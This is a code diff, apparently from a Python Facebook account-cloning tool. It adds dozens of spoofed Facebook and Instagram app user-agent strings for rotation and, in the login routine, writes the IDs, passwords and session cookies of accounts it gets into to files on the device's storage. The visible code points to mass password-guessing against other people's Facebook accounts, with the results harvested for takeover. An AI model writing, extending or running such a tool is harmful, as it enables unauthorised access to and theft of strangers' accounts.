@@ -92,7 +92,28 @@ def sex():
 	c = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 	d = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
 	e = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/cricket;FBMF/Alcatel;FBBD/TCL;FBPN/com.facebook.katana;FBDV/Alcatel_5008R;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
-	ua = a + b + c + d + e 
+	f = f"Mozilla/5.0 (Linux; Android 9; motorola one vision Build/PSA29.137-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.202 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]"
+	g = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/447.2.2.23.110;FBBV/557775792;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5;FBRV/0]"
+	h = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone16,2; iOS 17_2_1; ru_KG; ru; scale=3.00; 1290x2796; 555508374)"
+	i = f"Mozilla/5.0 (Linux; Android 13; CPH2375 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.207 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]"
+	j = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/441.0.0.13.112;FBBV/556714898;FBDV/iPhone16,1;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBCR/;FBID/phone;FBLC/fr;FBOP/80]"
+	k = f"Mozilla/5.0 (Linux; Android 12; M2003J15SC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]"
+	l = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (30/11; 440dpi; 1080x2134; Xiaomi/Redmi; Redmi Note 8 Pro; begonia; mt6785; it_IT; 556277190)"
+	m = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone12,1; iOS 17_2_1; en_GB; en; scale=2.00; 750x1624; 555508374)"
+	n = f"Mozilla/5.0 (Linux; Android 11; SM-A528B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]"
+	o = f"Mozilla/5.0 (Linux; Android 12; M2003J15SC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]"
+	p = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone14,2; iOS 17_2_1; pl_PL; pl; scale=3.00; 1170x2532; 555508374)"
+	q = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone15,3; iOS 17_2_1; ru_KZ; ru; scale=3.00; 1290x2796; 555508374)"
+	r = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21B101 Instagram 314.0.6.16.114 (iPhone14,7; iOS 17_1_2; it_IT; it; scale=3.00; 1170x2532; 555508374)"
+	s = f"Mozilla/5.0 (Linux; Android 13; Pixel 6a Build/TQ3A.230605.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 Instagram 312.1.0.34.111 Android (33/13; 420dpi; 1080x2205; Google/google; Pixel 6a; bluejay; bluejay; en_US; 548323755)"
+	t = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone13,4; iOS 17_2_1; en_GB; en; scale=3.00; 1284x2778; 555508374)"
+	u = f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 314.0.6.16.114 (iPhone12,1; iOS 16_6; pt_PT; pt; scale=2.00; 828x1792; 555508374)"
+	v = f"Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 440dpi; 1080x2177; Xiaomi/Redmi; 2201117TG; spes; qcom; en_GB; 556277190)"
+	w = f"Mozilla/5.0 (Linux; Android 9; Infinix X652B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (28/9; 320dpi; 720x1428; INFINIX MOBILITY LIMITED/Infinix; Infinix X652B; Infinix-X652B; mt6765; en_US; 556277188)"
+	x = f"Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 540dpi; 1080x2145; OPPO; CPH2333; OP530DL1; qcom; it_IT; 556277192)"
+	y = f"Mozilla/5.0 (Linux; Android 13; SM-A042M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 300dpi; 720x1465; samsung; SM-A042M; a04e; mt6765; es_US; 556277127)"
+	z = f"Mozilla/5.0 (Linux; Android 11; M2101K9AG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]"
+	ua = a + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + w + x + y + z
 	return ua
     
 #__________NEW IDX UA FOR METHOD 1_____________#
@@ -102,22 +123,28 @@ def F1():
 	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
 	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
 	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
-	e = "[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653472;FBDM/{density=3.5,width=1440,height=2712};FBLC/"+en+";FBRV/211985059;FBCR/"+fbcr+";FBMF/Google;FBBD/google;FBPN/"+kt+";FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
-	f ="[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
-	g ="[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2200};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
-	h ="[FBAN/FB4A;FBAV/259.0.0.36.115;FBBV/200359555;FBDM/{density=3.0,width=1080,height=2016};FBLC/nb_NO;FBRV/201364573;FBCR/Telia N;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H8266;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
-	i ="[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518813;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/202499965;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J727V;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-	j ="[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518851;FBDM/{density=2.75,width=1080,height=2131};FBLC/it_IT;FBRV/202206671;FBCR/I TIM;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-	k ="[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997198;FBDM/{density=3.0,width=1080,height=2120};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-	l ="[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629348;FBDM/{density=4.5,width=1440,height=2560};FBLC/en_US;FBRV/210561420;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G890A;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-	m ="[FBAN/FB4A;FBAV/251.0.0.31.111;FBBV/188827997;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/192128667;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q710(FGN);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-	n ="[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681576;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/204159830;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
-	o ="[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/211347975;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
-	p ="[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653466;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/211775167;FBCR/Xfinity Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
-	q ="[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851403;FBDM/{density=2.75,width=1080,height=2150};FBLC/en_GB;FBRV/0;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6 Pro;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-	r ="[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653414;FBDM/{density=2.0,width=720,height=1402};FBLC/en_US;FBRV/211387411;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S102DL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
-	t ="[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.5,width=1440,height=2712};FBLC/en_US;FBRV/210430229;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 2 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
-	ua = s + e + f + g + h + i + j + k + l + m + n + o + p + q + r + t
+	e = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681962;FBDM/{density=4.5,width=1440,height=2646};FBLC/"+en+";FBRV/212568638;FBCR/"+fbcr+" ;FBMF/LGE;FBBD/lge;FBPN/"+kt+";FBDV/VS988;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+	f = f"Mozilla/5.0 (Linux; Android 13; 2209116AG Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/441.0.0.23.113;]"
+	g = f"Mozilla/5.0 (Linux; Android 11; RMX2040 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.207 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;] [FB_IAB/FB4A;FBAV/446.0.0.27.352;]"
+	h = f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 [FBAN/FBIOS;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]"
+	i = f"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.26 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/443.0.0.23.229;]"
+	j = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A360 Instagram 314.0.6.16.114 (iPhone13,2; iOS 17_0_3; nl_BE; nl; scale=3.00; 1170x2532; 555508374)"
+	k = f"Mozilla/5.0 (Linux; Android 14; SM-G991B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (34/14; 480dpi; 1080x2176; samsung; SM-G991B; o1s; exynos2100; fr_FR; 556277190)"
+	l = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone14,3; iOS 17_2_1; de_DE; de; scale=3.00; 1284x2778; 555508374)"
+	m = f"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.26 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/443.0.0.23.229;]"
+	n = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone12,1; iOS 17_2_1; es_ES; es; scale=2.00; 828x1792; 555508374)"
+	o = f"Mozilla/5.0 (Linux; Android 13; 2310FPCA4G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]"
+	p = f"Mozilla/5.0 (Linux; Android 13; CPH2343 Build/TP1A.220624.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.5.115;] [FB_IAB/FB4A;FBAV/448.0.0.5.115;] [FB_IAB/FB4A;FBAV/448.0.0.5.115;]"
+	q = f"Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]"
+	r = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A360 Instagram 312.0.1.19.124 (iPhone15,5; iOS 17_0_3; en_IT; en; scale=3.00; 1290x2796; 548339486)"
+	t = f"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]"
+	u = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/447.2.2.23.110;FBBV/557775792;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/558614745]"
+	v = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 Instagram 314.0.6.16.114 (iPhone14,5; iOS 17_2_1; it_IT; it; scale=3.00; 1170x2532; 555508374)"
+	w = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/446.0.0.32.330;FBBV/554572428;FBDV/iPhone16,1;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/558388059]"
+	x = f"Mozilla/5.0 (Linux; Android 14; SM-A528B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.194 Mobile Safari/537.36 Instagram 313.0.0.26.328 Android (34/14; 420dpi; 1080x2273; samsung; SM-A528B; a52sxq; qcom; fr_BE; 554218307)"
+	y = f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 Instagram 313.0.2.9.339 (iPhone12,3; iOS 16_5_1; nl_NL; nl; scale=3.00; 1125x2436; 553462334)"
+	z = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/447.2.2.23.110;FBBV/557775792;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]"
+	ua = s + e + f + g + h + i + j + k + l + m + n + o + p + q + r + t + u + v + w + x + y + z
 	return ua
 
 #__________NEW IDX UA FOR METHOD 2_____________#
@@ -178,7 +205,7 @@ logo =(""" \x1b[38;5;8m
     [\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL NAME          \x1b[38;5;8m:   \033[1;37mUNKNOWN
     \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL OWNER         \x1b[38;5;8m:   \033[1;37mEIFF HUCZN
     \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL TYPE          \x1b[38;5;8m:   \033[1;37mFILE CLONING
-    \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL VERSION      \x1b[38;5;8m :   \033[1;36m0.1 
+    \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL VERSION      \x1b[38;5;8m :   \033[1;36m0.2 
 \033[1;37m====================================================""")
 
 def line():
@@ -296,13 +323,13 @@ def unkn0wn():
                                         time.sleep(1)
                                         unkn0wn()
                                 clear()
-                                print("\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mCHOOSE METHOD 4")
+                                print("\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mMETHOD 1 & 4 UPDATED")
                                 line()
                                 
                                 print('\x1b[38;5;8m  [\033[1;32m1\x1b[38;5;8m] \033[1;37mMETHOD 1 (working)')
                                 print('\x1b[38;5;8m  [\033[1;32m2\x1b[38;5;8m] \033[1;37mMETHOD 2 (under maintenance)')
                                 print('\x1b[38;5;8m  [\033[1;32m3\x1b[38;5;8m] \033[1;37mMETHOD 3 (under maintenance)')
-                                print('\x1b[38;5;8m  [\033[1;32m3\x1b[38;5;8m] \033[1;37mMETHOD 4 (working)')
+                                print('\x1b[38;5;8m  [\033[1;32m4\x1b[38;5;8m] \033[1;37mMETHOD 4 (working)')
                                 line()
                                 mthd=input('\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mCHOOSE \x1b[38;5;8m: \x1b[1;37m')
                                 line()
@@ -409,7 +436,8 @@ def api1(ids,names,passlist):
 				print('\r\r\033[1;32m ╭─\033[38;5;8m[\033[1;32mFB LINK:\033[38;5;8m] \033[1;33mhttps://www.facebook.com/'+uid+'\033[38;5;8m')
 				print('\r\r\033[1;32m ╰─\033[38;5;8m[\033[1;32mCOOKIE:\033[38;5;8m] \033[1;39m'+cookies+'\033[1;32m\n')
 				#cek_apk(session,coki)
-				open('/sdcard/UNKN0WNm1-OK.txt','a').write(uid+' | '+pas+' | '+cookies+'\n')
+				open('/sdcard/UNKN0WNm1-OK.txt','a').write(uid+' | '+pas+'\n')
+				open('/sdcard/UNKNOWNm1-COOKIES.txt','a').write(uid+' | '+pas+' ==>> '+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
